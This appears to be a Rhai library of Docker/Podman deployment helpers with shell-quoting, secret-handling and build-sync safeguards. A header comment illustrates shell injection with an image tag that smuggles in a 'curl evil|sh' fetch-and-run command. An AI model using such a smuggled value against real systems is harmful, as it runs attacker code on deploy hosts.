// docker.rhai — Container lifecycle helpers for Energize deployments.
//
// Provides build, push, pull, run, stop, remove, cleanup, and container
// inspection primitives. Works with Docker, Podman, OrbStack, or nerdctl
// via the runtime abstraction layer (lib/runtime.rhai). `docker_build`'s local branch and
// `docker_push`'s local-machine overload ALSO prefer Apple's `container` tool (macOS 26+, Apple
// Silicon) when it's installed and healthy — see lib/runtime.rhai's `local_build_cmd()` doc
// comment for why that's a separate axis from the runtime every OTHER function here uses.
//
// Usage:
//   import "lib/docker" as docker;
//   docker::docker_build(tag, #{context: ".", dockerfile: "Dockerfile"});
//   docker::docker_run(host, tag, name, #{ports: #{"80": "3000"}});
//
// CONTAINER-OVERLAY CONTRACT (dry-run fidelity): all container existence /
// state / health READS and container MUTATIONS go through the typed `sim_*`
// builtins, NEVER through a raw `docker inspect` / `nc -z` over ssh_exec — that
// would bypass the dry-run sim and diverge. So:
//   docker_container_running -> sim_container_running
//   docker_image_id          -> sim_image_id
//   docker_run               -> builds the cmd then sim_docker_run
//   docker_stop/rename/remove-> sim_docker_stop/rename/remove
// Raw ssh_exec is fine ONLY for effects that don't feed a later read
// (pull, prune, exec-into, logs).
//
// SHELL-SAFETY CONTRACT (issue #10): every caller-supplied value interpolated into a
// command is wrapped with sh_quote() before it reaches the shell. Image tags (from CI /
// branch names), container names, ports, env keys/values, volumes, networks, and build
// args all flow from user input, so an unquoted `app:v1;curl evil|sh` would otherwise run
// arbitrary commands on every host. The container runtime command (container_cmd(), e.g.
// "docker") and the fixed runtime flags are trusted constants and are NOT quoted.
//
// SECRET-OFF-ARGV CONTRACT (issue #11): container env vars are NEVER passed as `-e k=v`
// (which lands on the remote argv, visible via `ps`/`docker inspect`). docker_run writes
// them to a 0600 remote env-file via write_remote (stdin, off-argv) and passes --env-file.

import "lib/runtime" as rt;

// ---------------------------------------------------------------------------
// Build & Push (local)
// ---------------------------------------------------------------------------

// docker_build(tag, cfg) — build a container image locally, or on a remote `cfg.build_host`.
//   cfg: #{context: ".", dockerfile: "Dockerfile", build_args: #{}, platform: "", build_host: ""}
//
// `platform` (e.g. "linux/amd64", "linux/arm64") targets an architecture other than the build
// machine's own — the common case is building on an Apple Silicon laptop for an x86 VPS. A plain
// `docker build` bakes in the LOCAL architecture; without this, the mismatch doesn't surface
// until the container fails to start on the host with an opaque exec-format error, after
// build/push/pull have all already appeared to succeed. When set to a single platform, this uses
// `buildx build --platform <value> --load` instead of a plain `build` — `--load` keeps the result
// as a normal local image so the existing separate `docker_push` step still works unchanged.
//
// A comma-separated `platform` list (e.g. "linux/amd64,linux/arm64") builds a genuine
// multi-platform MANIFEST LIST instead: `buildx` cannot `--load` more than one platform into
// the local image store, so this uses `--push` and publishes the manifest list straight to the
// registry during the build. `deploy()` detects the same comma and skips its own separate
// `docker_push` step, since there is nothing local left to push.
// RUNTIME CAVEAT: `buildx` is a Docker/Podman concept — nerdctl (already "experimental" per
// lib/runtime.rhai) has no `buildx` subcommand, so `platform` combined with
// `rt::set_runtime("nerdctl")` will fail at the shell, not at plan time. Stick to docker/podman
// when using `platform`.
//
// `build_host` (roadmap 1.1 step 3a): when set, the build runs on THAT host over SSH instead of
// this machine — e.g. a native arm64 builder box, so an arm64 target doesn't need buildx/qemu
// emulation at all (this composes with `platform` too: it's just WHERE the same build command
// runs). `context` is synced there first via `sync_build_context` below (see that function's own
// doc comment for why tar+base64, not a new transport). LIMITATION: only `context` is synced —
// `dockerfile` must resolve to a path INSIDE `context` (the default, `"Dockerfile"`, always
// does); a `dockerfile` pointing outside `context` (e.g. `"../shared/Dockerfile"`) will not be
// found on `build_host` and the remote build will fail. If `!cfg.skip_push`, the caller (deploy())
// must push the built image from `build_host` too (see `docker_push(host, tag)` below) — it only
// exists there, this machine never receives it.
//
// APPLE CONTAINER: only the LOCAL branch (`build_host == ""`) ever resolves to Apple's `container`
// tool — via `rt::local_build_cmd()`, never `rt::container_cmd()` (see lib/runtime.rhai's own
// header comment for why). The remote branch below is completely untouched by this: a
// `build_host` is a Linux box, which can never run Apple's macOS-only tool.
// Returns the ExecResult from the build command; throws on failure.
fn docker_build(tag, cfg) {
    let context = if cfg.contains("context") { cfg.context } else { "." };
    let dockerfile = if cfg.contains("dockerfile") { cfg.dockerfile } else { "Dockerfile" };
    let build_args = if cfg.contains("build_args") { cfg.build_args } else { #{} };
    let platform = if cfg.contains("platform") { cfg.platform } else { "" };
    let build_host = if cfg.contains("build_host") { cfg.build_host } else { "" };

    let arg_parts = [];
    for k in build_args.keys() {
        // Quote the whole k=v token so a value with shell metacharacters stays literal.
        arg_parts.push("--build-arg " + sh_quote(k + "=" + build_args[k]));
    }
    let args = join(arg_parts, " ");

    if build_host == "" {
        let cmd_name = rt::local_build_cmd();
        let subcmd = build_subcmd(cmd_name, platform);
        let cmd = cmd_name + " " + subcmd + " -t " + sh_quote(tag) + " -f " + sh_quote(dockerfile) + " " + args + " " + sh_quote(context);
        let r = local_exec(cmd);
        if !r.ok {
            throw cmd_name + " build failed:\n" + r.stderr;
        }
        return r;
    }

    // Remote build: sync `context` to a fixed path on `build_host`, then `cd` there and build
    // with context "." — this way `dockerfile` (relative to `context` by convention) resolves
    // correctly on the remote side without having to rewrite it.
    //
    // The synced copy is REMOVED again as the last step of this same command
    // (`; rc=$?; rm -rf <dir>; exit $rc`) instead of being left behind until the next sync:
    // `/tmp` on a build host is shared with every other local user there, and the context is a
    // full copy of this project's source. Appending the cleanup to the build command (rather
    // than issuing a second ssh_exec) keeps it tied to the build — it runs whether the build
    // succeeded or failed, and even if the `cd` itself failed — without adding another planned
    // action, and `rc` carries the build's OWN exit code through to the `.ok` check below so
    // nothing is masked by the `rm`.
    let remote_dir = "/tmp/.nrg-build-ctx-" + sh_quote_safe_name(tag);
    sync_build_context(build_host, context, remote_dir);
    let subcmd = build_subcmd(rt::container_cmd(), platform);
    let cmd = "cd " + sh_quote(remote_dir) + " && " + rt::container_cmd() + " " + subcmd + " -t " +
        sh_quote(tag) + " -f " + sh_quote(dockerfile) + " " + args + " . ; rc=$?; rm -rf " +
        sh_quote(remote_dir) + "; exit $rc";
    let r = ssh_exec(build_host, cmd);
    if !r.ok {
        throw rt::container_cmd() + " build on " + build_host + " failed:\n" + r.stderr;
    }
    r
}

// build_subcmd(cmd_name, platform) — the `build`/`buildx build ...` subcommand text for a given
// resolved runtime binary and `cfg.platform` value.
//
// Apple's `container` tool takes `--platform` natively on plain `build` — no buildx-equivalent
// wrapper is documented for a comma-separated MULTI-platform manifest-list build (unlike
// docker/podman's buildx `--push`). Fable final review: whether Apple's real CLI rejects a
// comma-joined `--platform` value is UNCONFIRMED (its docs show `--platform` taking one
// `os/arch[/variant]`, repeatable via multiple flags — plausibly incompatible with a single
// comma-joined value, but not tested against a live install). This is passed straight through,
// EXPECTED to fail at the shell rather than at plan time (not guaranteed, and not guessed at
// beyond that) — same honest treatment as the existing nerdctl+buildx caveat below.
private fn build_subcmd(cmd_name, platform) {
    if cmd_name == "container" {
        if platform == "" { "build" } else { "build --platform " + sh_quote(platform) }
    } else if platform == "" {
        "build"
    } else if platform.contains(",") {
        "buildx build --platform " + sh_quote(platform) + " --push"
    } else {
        "buildx build --platform " + sh_quote(platform) + " --load"
    }
}

// docker_build(tag) — 0-cfg overload (defaults).
fn docker_build(tag) {
    docker_build(tag, #{})
}

// sync_build_context(host, context, remote_dir) — mirror local `context` into `remote_dir` on
// `host` over SSH (roadmap 1.1 step 3a).
//
// The roadmap's own survey found this codebase has no context-sync primitive at all — no
// rsync/scp is ever invoked by any stdlib function (only checked for on PATH, by `nrg doctor`).
// This builds one from EXISTING primitives (`local_exec`, `ssh_exec_stdin`) rather than adding
// new Rust-level plumbing: `tar` the context locally, pipe through `base64`, ship the result as
// an ExecResult.stdout/ssh_exec_stdin string, decode and extract remotely. base64 is required,
// not cosmetic — `ExecResult.stdout`/`ssh_exec_stdin`'s payload round-trip through Rust `String`s
// (`String::from_utf8_lossy` in src/engine/runner.rs), which would silently corrupt raw binary
// tar bytes; keeping every byte within the ASCII-safe base64 alphabet avoids that entirely. The
// whole archive is buffered in memory as a string on both ends (no streaming) — fine for a
// typical app's build context, but keep `context` small (a large `node_modules`/`.git`, say,
// makes this slow and memory-heavy on both sides — the SAME reason Docker's own `.dockerignore`
// exists, which is why this honors one below).
//
// `context/.dockerignore`, if present, is passed to local `tar` as `--exclude-from` — best
// effort: tar's `--exclude` glob syntax isn't a perfect match for `.dockerignore`'s, but this
// covers the common case (`.git`, `node_modules`, ...) and avoids shipping the whole thing to
// `host` uselessly. A normal LOCAL `docker build .` parses `.dockerignore` itself before sending
// the build context to the daemon; without this, a remote build_host sync would ship everything.
//
// `rm -rf` before `mkdir -p`, not after the build: tar extraction is additive, so a stale file
// left over from a PREVIOUS sync to this same path (e.g. a file removed from the local context
// since) would otherwise silently survive into this build — wiping first makes every sync exactly
// match the current local `context`, never a leftover.
//
// CREDENTIALS ARE NEVER SYNCED. A bare `tar -czf … .` archives EVERYTHING at the context root,
// and a project root is exactly where nrg keeps its own secrets: `.nrg-key` (the unpassphrased
// age identity that decrypts every `ENC[...]` token and `.enc` file), `.nrg-key.pub`, `.energize/`
// (deploy state, which may hold secret plaintext — see docs/safety.md R24) and `.env`. Shipping
// those to a build host would copy the key that unlocks every secret onto a THIRD machine, into
// world-listable `/tmp`, for a build that has no use for any of it. So instead of handing tar the
// whole directory, the top-level entries are enumerated by the shell and passed as explicit
// operands with those four names skipped:
//
//   - Enumeration is by GLOB (`.[!.]* ..?* *`), never `$(ls)`: `ls` output can't be parsed
//     safely for names with spaces or newlines. Each entry is passed as `./name`, so a name
//     starting with `-` or `@` is a path rather than a tar option, and `*` / `[b]` in a name
//     survive verbatim because `"$@"` is never re-split or re-globbed. A glob that matches
//     nothing stays literal in POSIX sh, hence the `[ -e ] || [ -L ]` guard that drops it.
//   - The operands are `./name`, NOT `tar --exclude=name`: an exclude pattern is unanchored in
//     bsdtar, so `--exclude=.env` would also drop a nested `sub/.env` that IS part of the build.
//     Naming the members explicitly only ever affects the context ROOT, which is the whole point
//     — a `config/.env` the app really builds against is still shipped.
//   - An empty context (or one holding nothing BUT those four) fails here, locally, with a clear
//     message rather than syncing an empty dir and failing later on the remote build.
//
// A side effect worth knowing about: because the archive no longer contains a `./` member for
// the context root itself, extraction no longer restores the LOCAL context dir's mode onto
// `remote_dir` (a 0755 context used to widen the 0700 dir back out) — `mkdir -m 700` now sticks.
//
// `umask 077` covers the local temp archive: it lands in `/tmp` too and holds the same context
// bytes, so a default 0644 would leave every local user a readable copy for the life of the sync.
private fn sync_build_context(host, context, remote_dir) {
    // `mkdir -m 700`: the dir is created private in one step, so the synced source is never
    // world-listable on a shared `/tmp`, not even briefly between creation and a later chmod.
    let clean = ssh_exec(host, "rm -rf " + sh_quote(remote_dir) + " && mkdir -m 700 -p " + sh_quote(remote_dir));
    if !clean.ok {
        throw "Failed to prepare remote build context dir on " + host + " (" + remote_dir + "):\n" + clean.stderr;
    }
    // Opus review: piping tar's stdout straight into `base64` masked tar's own exit code — `sh -c`
    // has no `pipefail` (POSIX sh, not bash), so a pipeline's exit status is the LAST stage's, and
    // `base64` essentially never fails. A tar that dies partway through (permission denied on one
    // file, a file that changed mid-read, ...) still emits a VALID archive of whatever it read
    // before dying, so `archived.ok` used to come back true for a silently INCOMPLETE context —
    // worse than an outright failure, since the remote build then runs (and can "succeed")
    // against the wrong code. Route through a local temp file instead: tar writes there directly
    // and its OWN exit status (`rc`) is captured before anything else runs; base64-encoding it is
    // a separate step gated on `rc == 0`, so a tar failure now always fails this call, base64
    // never runs over partial data, and the temp file is removed either way.
    let local_tar = remote_dir + ".local.tgz";
    let tar_cmd = "cd " + sh_quote(context) + " && { umask 077; set --; " +
        "for e in .[!.]* ..?* *; do " +
        "[ -e \"$e\" ] || [ -L \"$e\" ] || continue; " +
        "case \"$e\" in .nrg-key|.nrg-key.pub|.energize|.env) continue;; esac; " +
        "set -- \"$@\" \"./$e\"; done; " +
        "[ $# -gt 0 ] || { echo \"nothing to sync: the context is empty apart from nrg " +
        "credentials (.nrg-key, .nrg-key.pub, .energize, .env), which are never synced to a " +
        "remote builder\" >&2; exit 1; }; " +
        "tar -czf " + sh_quote(local_tar) + " " +
        "$([ -f .dockerignore ] && echo --exclude-from=.dockerignore) \"$@\" ; rc=$?; " +
        "if [ $rc -eq 0 ]; then base64 < " + sh_quote(local_tar) + "; fi; " +
        "rm -f " + sh_quote(local_tar) + "; exit $rc; }";
    let archived = local_exec(tar_cmd);
    if !archived.ok {
        throw "Failed to archive build context '" + context + "' for remote build on " + host + ":\n" + archived.stderr;
    }
    let synced = ssh_exec_stdin(host, "base64 -d | tar -xzf - -C " + sh_quote(remote_dir), archived.stdout);
    if !synced.ok {
        throw "Failed to sync build context to " + host + " (" + remote_dir + "):\n" + synced.stderr;
    }
}

// docker_push(host, tag) — push an image to its registry from `host` (empty = this machine).
// Use a non-empty `host` when the image was built there via `docker_build`'s `cfg.build_host`
// (roadmap 1.1 step 3a) — the image only exists on that machine, never here.
//
// APPLE CONTAINER: only the `host == ""` (local) branch ever resolves to Apple's `container` tool
// (via `rt::local_build_cmd()`) — its image operations are namespaced under `image` (`container
// image push`), unlike the flat `push` docker/podman/nerdctl all share, so the subcommand text
// itself depends on which binary resolved. The remote branch always uses `rt::container_cmd()`
// unchanged — a remote `host` is a Linux box, which can never run Apple's macOS-only tool.
fn docker_push(host, tag) {
    let cmd_name = if host == "" { rt::local_build_cmd() } else { rt::container_cmd() };
    let push_cmd = if cmd_name == "container" { cmd_name + " image push " } else { cmd_name + " push " };
    let r = if host == "" {
        local_exec(push_cmd + sh_quote(tag))
    } else {
        ssh_exec(host, push_cmd + sh_quote(tag))
    };
    if !r.ok {
        throw push_cmd + "failed" + (if host == "" { "" } else { " on " + host }) + ":\n" + r.stderr;
    }
    r
}

// docker_push(tag) — 1-arg overload: push from the local machine (unchanged pre-3a behavior).
fn docker_push(tag) {
    docker_push("", tag)
}

// ---------------------------------------------------------------------------
// Pull (remote)
// ---------------------------------------------------------------------------

// docker_pull(host, tag) — pull an image on a remote host.
fn docker_pull(host, tag) {
    let r = ssh_exec(host, rt::container_cmd() + " pull " + sh_quote(tag));
    if !r.ok {
        throw rt::container_cmd() + " pull on " + host + " failed:\n" + r.stderr;
    }
    r
}

// docker_pull_all(hosts, tag) — pull an image on all hosts in parallel.
// Returns the list of ExecResult; throws listing failed hosts.
fn docker_pull_all(hosts, tag) {
    let results = ssh_exec_all(hosts, rt::container_cmd() + " pull " + sh_quote(tag));
    let failed = results.filter(|r| !r.ok);
    if !failed.is_empty() {
        let names = failed.map(|r| r.host);
        throw rt::container_cmd() + " pull failed on: " + join(names, ", ");
    }
    results
}

// ---------------------------------------------------------------------------
// Run
// ---------------------------------------------------------------------------

// Robustness review R19: the env-file format is line-based (`KEY=VALUE`, one per line) — nothing
// enforced that a key or value couldn't itself contain the very characters that format depends
// on. A CI-sourced value containing a literal newline (a PEM-encoded key, say) silently injected
// EXTRA `KEY=VALUE` lines into the container's environment — effectively letting a value smuggle
// in arbitrary additional env vars the caller never intended. Called once per key before any
// env-file line is built, so the failure happens up front, not mid-write.
private fn validate_env_entry(k, v) {
    if k.contains("\n") || k.contains("\r") {
        throw "docker env var name " + k.to_debug() + " contains a newline, which would inject " +
              "extra lines into the env-file (robustness review R19).";
    }
    if k.contains("=") {
        throw "docker env var name " + k.to_debug() + " contains '=', which is not a valid " +
              "environment variable name (robustness review R19).";
    }
    // `v` can legitimately be a non-string (int, bool, float — Rhai map values aren't restricted,
    // and the line below concatenates it with `+` regardless), but `.contains()` is only defined
    // for a string receiver — calling it on a bare int/bool used to throw an opaque "Function not
    // found: contains" error instead of validating anything (found during this fix's own final
    // review). Coerce to the SAME string representation `k + "=" + v` will actually write, then
    // validate that.
    let vs = "" + v;
    if vs.contains("\n") || vs.contains("\r") {
        throw "docker env var " + k + "'s value contains a newline, which would inject extra " +
              "lines into the env-file (robustness review R19) — e.g. a PEM-encoded key can't " +
              "be passed as a single env value this way. Base64-encode it instead.";
    }
}

// docker_run(host, tag, name, cfg) — run a container on a remote host.
//   cfg: #{ports: #{host_port: container_port}, envs: #{}, volumes: #{},
//          network: "", extra: ""}
// Builds the `<cmd> run -d ...` string then routes it through sim_docker_run so
// the dry-run sim records the new container as running+healthy.
//
// Env vars are delivered via a 0600 remote env-file (off-argv, issue #11), NOT `-e k=v`.
// Every interpolated value is sh_quote()'d (issue #10) EXCEPT `extra`, a TRUSTED-INPUT-ONLY
// raw-shell escape hatch (robustness review R28): it is spliced into the command verbatim,
// with NO quoting or escaping applied, unlike every other field here. Never build it from
// untrusted input, and keep secrets out of it (use `envs` instead — see docs/safety.md,
// "Escape hatches: trusted-input-only raw shell").
// Throws if the env-file write itself fails (robustness review R30) — a silently-ignored
// failure there could let the container start against a stale env-file from a prior run.
// Returns the ExecResult (caller checks .ok).
fn docker_run(host, tag, name, cfg) {
    let ports = if cfg.contains("ports") { cfg.ports } else { #{} };
    let envs = if cfg.contains("envs") { cfg.envs } else { #{} };
    let volumes = if cfg.contains("volumes") { cfg.volumes } else { #{} };
    let network = if cfg.contains("network") { cfg.network } else { "" };
    let extra = if cfg.contains("extra") { cfg.extra } else { "" };

    let parts = [rt::container_cmd() + " run -d " + rt::runtime_run_flags()];
    parts.push("--name " + sh_quote(name));

    for hp in ports.keys() {
        parts.push("-p " + sh_quote(hp + ":" + ports[hp]));
    }

    // Env vars go to a 0600 remote env-file (stdin, off-argv) instead of `-e k=v` so they never
    // appear on the remote argv (`ps -ef`, `docker inspect`). Skip the file when there are none.
    if !envs.keys().is_empty() {
        let lines = [];
        for k in envs.keys() {
            // Each line is `KEY=VALUE`. Values are written literally to the file (no shell
            // involved) — docker reads them verbatim. validate_env_entry (robustness review R19)
            // refuses a key/value containing a newline or a key containing `=` up front, instead
            // of silently letting either corrupt the line-based format.
            validate_env_entry(k, envs[k]);
            lines.push(k + "=" + envs[k]);
        }
        // Checked (robustness review R30): this path is fixed per container NAME, not per run —
        // an accessory redeploy (accessory_run in deploy.rhai passes a stable, non-unique name)
        // reuses the same path every time. An unchecked write on a failed re-run would silently
        // leave `docker run --env-file` reading a STALE file from a prior successful run instead
        // of erroring, so the container would start looking healthy with old env vars/secrets.
        let env_path = "/tmp/.nrg-env-" + name;
        let wr = write_remote(host, join(lines, "\n") + "\n", env_path);
        if !wr.ok {
            throw "Failed to write env-file on " + host + " (" + env_path + "):\n" + wr.stderr;
        }
        parts.push("--env-file " + sh_quote(env_path));
    }

    for hp in volumes.keys() {
        parts.push("-v " + sh_quote(hp + ":" + volumes[hp]));
    }
    if network != "" {
        parts.push("--network " + sh_quote(network));
    }
    if extra != "" {
        parts.push(extra);
    }
    parts.push(sh_quote(tag));

    let cmd = join(parts, " ");
    sim_docker_run(host, tag, name, cmd)
}

// docker_run(host, tag, name) — 0-cfg overload.
fn docker_run(host, tag, name) {
    docker_run(host, tag, name, #{})
}

// docker_run_once(host, tag, command, cfg) — run `command` inside a THROWAWAY container built
// from image `tag` (`docker run --rm`), then return the ExecResult. This is the correct way to
// run release tasks (DB migrations, asset precompile) BEFORE a deploy: they must execute against
// the NEW image's code, never `exec` into the still-running OLD container (issue #8). Env vars
// are delivered via a 0600 remote env-file (off-argv, issue #11); every value is sh_quote()'d
// EXCEPT `command` itself, a TRUSTED-INPUT-ONLY raw-shell escape hatch (robustness review R28
// — see below where it's spliced in).
//   cfg: #{ envs: #{}, network: "" }
// Plain ssh_exec (NOT sim-routed): the container exits immediately, so it never feeds a later
// sim read; under dry-run it records + returns synthetic ok like any other command.
fn docker_run_once(host, tag, command, cfg) {
    let envs = if cfg.contains("envs") { cfg.envs } else { #{} };
    let network = if cfg.contains("network") { cfg.network } else { "" };

    let parts = [rt::container_cmd() + " run --rm"];
    if !envs.keys().is_empty() {
        let lines = [];
        for k in envs.keys() {
            // Same up-front validation as docker_run's env-file (robustness review R19).
            validate_env_entry(k, envs[k]);
            lines.push(k + "=" + envs[k]);
        }
        // Unique-ish path per (image command) run; the file is 0600 and short-lived. Checked
        // (robustness review R30): repeated releases of the same tag reuse this same path, so an
        // unchecked write on a failed re-run would silently reuse a stale env-file instead of
        // erroring, same risk as docker_run's env-file above.
        let env_path = "/tmp/.nrg-release-env-" + sh_quote_safe_name(tag);
        let wr = write_remote(host, join(lines, "\n") + "\n", env_path);
        if !wr.ok {
            throw "Failed to write env-file on " + host + " (" + env_path + "):\n" + wr.stderr;
        }
        parts.push("--env-file " + sh_quote(env_path));
    }
    if network != "" {
        parts.push("--network " + sh_quote(network));
    }
    parts.push(sh_quote(tag));
    // `command` is a TRUSTED-INPUT-ONLY raw-shell escape hatch (robustness review R28): it is
    // spliced in verbatim (e.g. "bin/rails db:migrate") so the entrypoint receives it as the
    // container command, with NO sh_quote()/escaping applied. Never build it from untrusted
    // input, and keep secrets out of it (use `envs` instead).
    parts.push(command);

    ssh_exec(host, join(parts, " "))
}

// sh_quote_safe_name(s) — a filesystem-safe slug of `s` for building temp file names (the raw
// value still gets sh_quote()'d when it reaches the shell; this just avoids `/` and `:` in paths).
// Rhai string `replace` mutates in place, so work on a local copy.
private fn sh_quote_safe_name(s) {
    let t = "" + s;
    t.replace("/", "_");
    t.replace(":", "_");
    t
}

// ---------------------------------------------------------------------------
// Stop / Remove / Rename  (sim-routed mutations)
// ---------------------------------------------------------------------------

// docker_stop(host, name, cfg) — stop a running container.  cfg: #{timeout: 30}
fn docker_stop(host, name, cfg) {
    let timeout = if cfg.contains("timeout") { cfg.timeout } else { 30 };
    let cmd = rt::container_cmd() + " stop -t " + sh_quote("" + timeout) + " " + sh_quote(name) + " 2>/dev/null || true";
    sim_docker_stop(host, name, cmd)
}

// docker_stop(host, name) — 2-arg overload (timeout 30).
fn docker_stop(host, name) {
    docker_stop(host, name, #{})
}

// docker_remove(host, name) — remove a container.
fn docker_remove(host, name) {
    let cmd = rt::container_cmd() + " rm -f " + sh_quote(name) + " 2>/dev/null || true";
    sim_docker_remove(host, name, cmd)
}

// docker_rename(host, old_name, new_name) — rename a container.
// Fable review (full-project pass): the remote command used to always end in
// `2>/dev/null || true`, so EVERY docker-level failure looked identical to success, stderr
// discarded too — not just the idempotent "old_name doesn't exist" case that `|| true` exists
// for (a retry after a previous partial run already renamed it away). That also swallowed a
// REAL conflict: if `new_name` is already in use by some other container (e.g. a stale leftover
// from an earlier interrupted deploy), the rename silently fails to happen, yet the caller's
// `.ok` check (deploy.rhai's post-commit cleanup) saw `ok: true` and persisted state as though
// the swap completed. Now the remote command's real exit code/stderr flow through untouched, and
// this function classifies the failure itself: "No such container" (nothing to rename — the
// idempotent retry case) is still treated as success; anything else (name conflict, permission
// denied, daemon down, ...) is now surfaced as a real failure instead of masked.
fn docker_rename(host, old_name, new_name) {
    let cmd = rt::container_cmd() + " rename " + sh_quote(old_name) + " " + sh_quote(new_name);
    let r = sim_docker_rename(host, old_name, new_name, cmd);
    if r.ok {
        return r;
    }
    // An SSH-transport failure (dropped connection, auth failure, ...) never reached the remote
    // shell at all, so there's no docker-level result to reclassify — surface it unchanged.
    if r.exit_code == -1 {
        return r;
    }
    // The command DID run on the host and the runtime itself reported failure. Only the
    // idempotent "already renamed away" case is downgraded to success; anything else stays a
    // real failure. Matched case-insensitively against BOTH stdout and stderr merged: Docker
    // phrases this "Error: No such container: X", but Podman (a first-class supported runtime,
    // lib/runtime.rhai) phrases it differently ("no container with name or ID ... found: no such
    // container") — an exact-case, Docker-only match would misclassify a benign idempotent retry
    // on Podman as a real failure, reintroducing the false-alarm this fix exists to prevent.
    let combined = (r.stdout + r.stderr).to_lower();
    if combined.contains("no such container") {
        return #{ ok: true, exit_code: 0, stdout: r.stdout, stderr: r.stderr, host: host };
    }
    r
}

// docker_restart(host, name) — restart an existing container in place, reusing whatever
// image/config it's already running (`docker restart` also brings a stopped container back up).
// Sim-routed (unlike a hand-built ssh_exec): a stubbed restart marks the container running again,
// so a later read within the same dry run reflects the restart instead of a stale probe. Does
// NOT swallow failure (no `|| true`) — the caller checks `.ok` and throws with its own context,
// same as docker_run.
fn docker_restart(host, name) {
    let cmd = rt::container_cmd() + " restart " + sh_quote(name);
    sim_docker_restart(host, name, cmd)
}

// docker_network_create(host, name) — create a user-defined network on `host`, idempotently
// (roadmap 1.5, `nrg setup`). No `sim_*` wrapper: nothing in this codebase reads back "does this
// network exist" within a single dry run the way container state is read back, so a plain
// `ssh_exec` (still dry-run-safe — see exec.rs's mutating-builtin contract) is sufficient, same
// as `docker_pull`'s own simplicity.
fn docker_network_create(host, name) {
    // No `2>&1`: the already-exists check below already combines stdout+stderr itself, and a
    // real remote failure needs its stderr text intact for docker_network_create_all's throw
    // message below (Fable review: the redirect folded stderr into stdout, so that throw —
    // which only reads r.stderr — printed an empty reason on every real failure).
    let cmd = rt::container_cmd() + " network create " + sh_quote(name);
    let r = ssh_exec(host, cmd);
    if r.ok {
        return r;
    }
    // An SSH-transport failure never reached the remote shell — surface it unchanged, same
    // classification convention as docker_rename's M6 fix.
    if r.exit_code == -1 {
        return r;
    }
    // The command DID run and the runtime reported failure. "Already exists" (a previous
    // `nrg setup` run, or the network was created out-of-band) is idempotent, not an error;
    // matched case-insensitively across stdout+stderr for the same Docker/Podman-phrasing-
    // divergence reason docker_rename's "no such container" match is.
    let combined = (r.stdout + r.stderr).to_lower();
    if combined.contains("already exists") {
        return #{ ok: true, exit_code: 0, stdout: r.stdout, stderr: r.stderr, host: host };
    }
    r
}

// docker_network_create_all(hosts, name) — create the network on every host in `hosts`.
// Throws naming the host on the first real (non-idempotent) failure — a network missing on
// even one host silently breaks any container there that expects to join it.
fn docker_network_create_all(hosts, name) {
    for host in hosts {
        let r = docker_network_create(host, name);
        if !r.ok {
            throw "Failed to create network " + name + " on " + host + ":\n" + r.stdout + r.stderr;
        }
    }
}

// ---------------------------------------------------------------------------
// Inspection  (sim-routed reads)
// ---------------------------------------------------------------------------

// docker_container_running(host, name) -> bool — true if the container exists
// and is running. Routed through the sim so dry-run stays consistent.
fn docker_container_running(host, name) {
    sim_container_running(host, name)
}

// docker_image_id(host, tag) -> String — image id for a tag, or "" if not found.
fn docker_image_id(host, tag) {
    sim_image_id(host, tag)
}

// ---------------------------------------------------------------------------
// Cleanup
// ---------------------------------------------------------------------------

// docker_cleanup(host, cfg) — prune exited containers + DANGLING (untagged) images only.
//   cfg: reserved, currently unused.
// Returns the container-prune ExecResult if IT failed (an SSH-level failure — the connection
// dropped, say — the `|| true` only masks a docker-level failure, never that), otherwise the
// image-prune ExecResult (found reviewing R6b: the container-prune result used to be discarded
// unconditionally, so a caller checking `.ok` couldn't tell a dropped connection during the
// FIRST prune from a clean run if the second one happened to still succeed).
//
// This does NOT remove old TAGGED versions of the deployed repo (e.g. `myapp:v41`, `myapp:v40`,
// ...) — those accumulate on a host across every deploy. See `docker_prune_old_images` below
// (robustness review R22) for that, called separately from `deploy()` when `cfg.keep_images` is
// set.
fn docker_cleanup(host, cfg) {
    let _cmd = rt::container_cmd();
    let r1 = ssh_exec(host, _cmd + " container prune -f 2>/dev/null || true");
    let r2 = ssh_exec(host, _cmd + " image prune -f 2>/dev/null || true");
    if !r1.ok { r1 } else { r2 }
}

// docker_cleanup(host) — 1-arg overload.
fn docker_cleanup(host) {
    docker_cleanup(host, #{})
}

// docker_prune_old_images(host, repo, keep_n, protect_tags) -> #{ok, removed, stderr}
//
// Robustness review R22: `docker_cleanup`'s `image prune` only removes DANGLING (untagged)
// images — a repo's own old TAGGED versions (`myapp:v41`, `myapp:v40`, ...) are never touched,
// so they accumulate on every deploy host forever until the disk fills. This removes tagged
// images of `repo` on `host` beyond the `keep_n` most recently created, while NEVER removing any
// tag listed in `protect_tags` regardless of age — the caller (`deploy()`) always protects the
// version just deployed and the previous version rollback() might still need.
//
// Lists via `--format`, not `sim_image_id`/etc: this is a prune (an effect with no later read),
// the same "raw ssh_exec is fine" carve-out `docker_cleanup` already relies on (see this file's
// CONTAINER-OVERLAY CONTRACT note at the top) — dry-run fidelity doesn't apply to a fire-and-forget
// disk-hygiene pass.
//
// Never throws: an image still referenced by any container (even stopped) fails to remove by
// Docker/Podman's OWN safety net — `|| true` treats that as expected, not a bug to route around.
// A failure to even LIST images (SSH-level, or the runtime CLI itself erroring) is reported via
// `ok: false` rather than guessed at — better to skip a pruning round than act on incomplete data.
fn docker_prune_old_images(host, repo, keep_n, protect_tags) {
    let _cmd = rt::container_cmd();
    let r = ssh_exec(host, _cmd + " images " + sh_quote(repo) + " --format '{{.Tag}}|{{.CreatedAt}}'");
    if !r.ok {
        return #{ ok: false, removed: [], stderr: r.stderr };
    }

    // Sort key is "<CreatedAt>|<tag>": Docker/Podman's default `{{.CreatedAt}}` is a fixed-width,
    // zero-padded "YYYY-MM-DD HH:MM:SS ..." string, so lexicographic order already agrees with
    // chronological order — no date parsing needed. Plain string sort + reverse (ascending, then
    // newest-first) avoids relying on a custom comparator.
    let keys = [];
    for line in r.stdout.split("\n") {
        line.trim();
        if line == "" { continue; }
        let parts = line.split("|");
        if parts.len() < 2 { continue; }
        let tag = parts[0];
        if tag == "<none>" { continue; } // dangling; docker_cleanup's image prune handles these
        keys.push(parts[1] + "|" + tag);
    }
    keys.sort();
    keys.reverse(); // newest first

    let removed = [];
    let kept = 0;
    for key in keys {
        let tag = key.split("|")[1];
        if protect_tags.contains(tag) { continue; }
        if kept < keep_n {
            kept += 1;
            continue;
        }
        let full = repo + ":" + tag;
        ssh_exec(host, _cmd + " rmi " + sh_quote(full) + " 2>/dev/null || true");
        removed.push(full);
    }
    #{ ok: true, removed: removed, stderr: "" }
}

// ---------------------------------------------------------------------------
// Exec into container
